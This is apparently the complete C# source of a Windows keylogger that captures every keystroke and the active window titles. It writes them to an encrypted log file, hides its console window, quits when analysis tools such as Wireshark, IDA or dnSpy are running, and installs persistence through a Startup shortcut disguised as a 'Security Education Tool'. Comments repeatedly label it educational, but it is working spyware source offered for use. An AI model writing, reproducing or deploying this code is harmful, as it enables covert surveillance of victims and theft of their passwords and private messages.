using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Reflection;
using System.Runtime.InteropServices.ComTypes;

// Add proper namespace references for the project structure
using Keylogger.Core;
using Keylogger.Core.Encryption;
using Keylogger.Core.InputMonitoring;
using Keylogger.Core.WindowTracking;
using Keylogger.Persistence.Startup;
using Keylogger.AntiDetection.ProcessMonitoring;

namespace Keylogger
{
    internal class Program
    {
        // COM interfaces needed for Windows Script Host functionality
        [ComImport]
        [Guid("00021401-0000-0000-C000-000000000046")]
        private class ShellLink { }

        [ComImport]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        [Guid("000214F9-0000-0000-C000-000000000046")]
        private interface IShellLink
        {
            void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszName, int cchMaxName);
            void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszDir, int cchMaxPath);
            void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszArgs, int cchMaxPath);
            void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
            void GetHotkey(out short pwHotkey);
            void SetHotkey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] System.Text.StringBuilder pszIconPath, int cchIconPath, out int piIcon);
            void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            void Resolve(IntPtr hwnd, int fFlags);
            void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
        }

        // Import required Windows API functions
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "keylog.txt");
        private static string currentActiveWindow = "";
        private static string encryptionKey = "12345678901234567890123456789012";

        static void Main(string[] args)
        {
            // Check command line arguments for educational functions
            if (args.Length > 0)
            {
                switch (args[0].ToLower())
                {
                    case "-decrypt":
                        ReadDecryptedLog();
                        return;
                    case "-install":
                        InstallForPersistence();
                        return;
                    case "-uninstall":
                        RemovePersistence();
                        return;
                }
            }

            // Hide console window for educational demonstration
            // In a real security research environment, you might want to keep this visible
            HideConsoleWindow();

            Console.WriteLine("Keylogger started for educational purposes.");
            Console.WriteLine($"Logging to: {logPath}");

            // Add runtime detection evasion
            if (DetectSecurityTools())
            {
                Console.WriteLine("Security software detected. Exiting for educational purposes.");
                Environment.Exit(0);
            }

            // Create log file
            using (System.IO.StreamWriter sw = System.IO.File.AppendText(logPath))
            {
                sw.WriteLine(Encrypt("=== Keylogger Started: " + DateTime.Now + " ==="));
            }

            // Start keylogging
            CaptureKeys();
        }

        static void HideConsoleWindow()
        {
            // For educational purposes - in real research you'd keep this visible
            var handle = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(handle, 0); // 0 = SW_HIDE
        }

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        static void CaptureKeys()
        {
            while (true)
            {
                Thread.Sleep(10); // Small delay to reduce CPU usage

                // Check for window changes
                CheckActiveWindowChange();

                // Check all key states
                for (int i = 0; i < 256; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    // Key was pressed since last check (0x8000 = high-order bit set)
                    if ((keyState & 0x8000) != 0)
                    {
                        string keyData = InterpretKeyCode(i);
                        if (!string.IsNullOrEmpty(keyData))
                        {
                            LogKeypress(keyData);
                        }
                    }
                }
            }
        }

        static void CheckActiveWindowChange()
        {
            IntPtr foregroundWindow = GetForegroundWindow();
            StringBuilder windowTitle = new StringBuilder(256);
            if (GetWindowText(foregroundWindow, windowTitle, 256) > 0)
            {
                string newWindow = windowTitle.ToString();
                if (newWindow != currentActiveWindow)
                {
                    currentActiveWindow = newWindow;
                    LogKeypress($"\r\n[Window: {currentActiveWindow} - {DateTime.Now}]\r\n");
                }
            }
        }

        static string InterpretKeyCode(int keyCode)
        {
            // Convert virtual key code to readable format
            switch (keyCode)
            {
                case 0x08: return "[Backspace]";
                case 0x09: return "[Tab]";
                case 0x0D: return "[Enter]\r\n";
                case 0x10: return "[Shift]";
                case 0x11: return "[Ctrl]";
                case 0x12: return "[Alt]";
                case 0x14: return "[CapsLock]";
                case 0x1B: return "[Esc]";
                case 0x20: return " ";
                // Navigation keys
                case 0x21: return "[PgUp]";
                case 0x22: return "[PgDown]";
                case 0x23: return "[End]";
                case 0x24: return "[Home]";
                case 0x25: return "[Left]";
                case 0x26: return "[Up]";
                case 0x27: return "[Right]";
                case 0x28: return "[Down]";
                case 0x2C: return "[PrtSc]";
                case 0x2D: return "[Insert]";
                case 0x2E: return "[Delete]";
                // Function keys
                case 0x70: return "[F1]";
                case 0x71: return "[F2]";
                case 0x72: return "[F3]";
                case 0x73: return "[F4]";
                case 0x74: return "[F5]";
                case 0x75: return "[F6]";
                case 0x76: return "[F7]";
                case 0x77: return "[F8]";
                case 0x78: return "[F9]";
                case 0x79: return "[F10]";
                case 0x7A: return "[F11]";
                case 0x7B: return "[F12]";
                default:
                    // For standard keys, convert to character
                    return !char.IsControl((char)keyCode) ? ((char)keyCode).ToString() : "";
            }
        }

        static void LogKeypress(string key)
        {
            try
            {
                // Write to file
                using (System.IO.StreamWriter sw = System.IO.File.AppendText(logPath))
                {
                    sw.Write(Encrypt(key));
                }

                // For research/debug, you might want to see the output
                Console.Write(key);
            }
            catch
            {
                // Fail silently for demonstration purposes
            }
        }

        static string Encrypt(string plainText)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(encryptionKey);
                aes.IV = new byte[16]; // Initialization vector (set to zeros for simplicity)

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter sw = new StreamWriter(cs))
                        {
                            sw.Write(plainText);
                        }
                    }
                    return Convert.ToBase64String(ms.ToArray());
                }
            }
        }

        static string Decrypt(string cipherText)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(encryptionKey);
                aes.IV = new byte[16]; // Same initialization vector as encryption

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                using (MemoryStream ms = new MemoryStream(Convert.FromBase64String(cipherText)))
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            return sr.ReadToEnd();
                        }
                    }
                }
            }
        }

        // Method to read and decrypt log file (for educational purposes)
        static void ReadDecryptedLog()
        {
            try
            {
                string[] lines = System.IO.File.ReadAllLines(logPath);
                Console.WriteLine("=== Decrypted Log Contents ===");
                foreach (string line in lines)
                {
                    try
                    {
                        Console.WriteLine(Decrypt(line));
                    }
                    catch
                    {
                        Console.WriteLine("[Could not decrypt line]");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading log: {ex.Message}");
            }
        }

        // Method to check for security tools running
        static bool DetectSecurityTools()
        {
            string[] securityTools = new string[] {
                "wireshark", "process explorer", "process monitor", "ida", 
                "ollydbg", "immunity debugger", "dnspy"
            };
            
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                try
                {
                    string processName = process.ProcessName.ToLower();
                    if (securityTools.Any(tool => processName.Contains(tool)))
                    {
                        return true;
                    }
                }
                catch { }
            }
            return false;
        }

        // Installation method for educational purposes
        static void InstallForPersistence()
        {
            try
            {
                string appPath = Assembly.GetExecutingAssembly().Location;
                string startupPath = System.IO.Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    "SecurityEducation.lnk");
                
                // Create a shortcut in the startup folder using COM interop
                IShellLink link = (IShellLink)new ShellLink();
                link.SetPath(appPath);
                link.SetWorkingDirectory(Path.GetDirectoryName(appPath));
                link.SetDescription("Security Education Tool");
                
                // Save the shortcut
                IPersistFile file = (IPersistFile)link;
                file.Save(startupPath, false);
                
                Console.WriteLine("Persistence installed for educational purposes");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error setting up persistence: {ex.Message}");
            }
        }

        // Removal method for educational purposes
        static void RemovePersistence()
        {
            try
            {
                string startupPath = System.IO.Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    "SecurityEducation.lnk");

                if (System.IO.File.Exists(startupPath))
                {
                    System.IO.File.Delete(startupPath);
                    Console.WriteLine("Persistence removed");
                }
                else
                {
                    Console.WriteLine("No persistence found");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error removing persistence: {ex.Message}");
            }
        }
    }
}
